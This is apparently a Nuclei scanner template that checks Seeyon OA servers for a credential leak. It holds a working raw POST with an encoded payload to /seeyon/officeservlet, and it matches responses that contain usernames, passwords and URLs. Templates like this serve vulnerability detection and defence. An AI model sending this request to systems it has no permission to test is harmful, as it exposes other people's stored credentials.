id: seeyon-oa-officeservlet-pwd-infoleak

info:
  name: seeyon-oa-officeservlet-pwd-infoleak
  author: seeyon
  severity: medium
  tags: seeyon

http:
  - raw:
      - |
        POST /seeyon/officeservlet HTTP/1.1
        Host: {{Hostname}}
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=98FCAEBB95CCBEB2C7209BEF7EAA7B3E; loginPageURL=
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 350

        DBSTEP V3.0     285             0               0              
        RECORDID=wLoi
        CREATEDATE=wLehP4whzUoiw=66
        originalFileId=wLoi
        needReadFile=yRWZdAS6
        originalCreateDate=wLehP4whzUoiw=66
        OPTION=LKDxOWOWLlxwVlOW
        TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli
        COMMAND=BSTLOlMSOCQwOV66
        affairMemberId=wLoi
        affairMemberName=wLoi

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "password=")'
          - 'contains(body, "username=")'
          - 'contains(body, "url=")'
        condition: and
